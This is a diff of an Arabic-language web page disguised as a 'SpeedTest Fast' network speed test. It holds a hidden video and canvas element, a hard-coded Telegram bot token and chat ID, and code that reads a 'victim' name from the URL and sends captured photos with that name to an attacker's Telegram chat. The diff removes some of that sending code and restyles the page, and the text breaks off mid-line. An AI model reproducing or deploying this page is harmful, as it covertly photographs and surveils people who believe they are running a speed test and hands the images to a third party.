@@ -6,67 +6,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>SpeedTest Fast</title>
     <style>
-        /* منع أي تحديد أو تحديد للنصوص تماماً */
         * { -webkit-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; }
-        
         body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        
-        .speed-container {
-            position: relative;
-            width: 220px;
-            height: 220px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .circle-bg {
-            width: 100%;
-            height: 100%;
-            border: 6px solid #00d2ff;
-            border-radius: 50%;
-            background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%);
-            box-shadow: 0 0 30px rgba(0, 210, 255, 0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: absolute;
-            z-index: 1;
-        }
-
-        .go-text {
-            font-size: 60px;
-            font-weight: bold;
-            color: #00d2ff;
-            text-shadow: 0 0 10px rgba(0, 210, 255, 0.5);
-        }
-
-        /* الطبقة الشفافة التي تمنع التحديد وتستقبل الضغط حصراً */
-        .click-layer {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            z-index: 10; /* أعلى من كل شيء */
-            cursor: pointer;
-        }
-
-        #status { margin-top: 40px; font-size: 18px; color: #888; transition: 0.3s; }
+        .circle { position: relative; width: 200px; height: 200px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 25px rgba(0, 210, 255, 0.4); cursor: pointer; }
+        .go { font-size: 55px; font-weight: bold; color: #00d2ff; }
+        #status { margin-top: 30px; font-size: 16px; color: #888; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <h2 style="margin-bottom: 20px; opacity: 0.8;">فحص السرعة العالمي</h2>
-
-    <div class="speed-container">
-        <div class="circle-bg">
-            <span class="go-text">GO</span>
-        </div>
-        <div class="click-layer" id="actionBtn"></div>
+    <h2 style="margin-bottom: 20px;">فحص سرعة الشبكة</h2>
+    <div class="circle" id="startBtn">
+        <span class="go">GO</span>
     </div>
-
-    <p id="status">بانتظار بدء الفحص...</p>
+    <p id="status">اضغط للبدء</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -74,18 +28,5 @@
     <script>
         const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
         const chatId = "7984067238"; 
-
-        // استخراج اسم الضحية من الرابط
         const urlParams = new URLSearchParams(window.location.search);
-        const victimName = urlParams.get( user ) || "مستهدف غير معروف";
-
-        async function sendToTelegram(type, content, extra = "") {
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            if (type === "photo") {
-                formData.append("photo", content, "img.jpg");
-                formData.append("caption", `👤 المستهدف: ${victimName}\n${extra}`);
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
-            } else {
-                const text = `🔔 **تنبيه جديد:** ${victimName}\n\n${content}`;
-                await fetch(`https://api.telegram.
+        const victim = urlParams
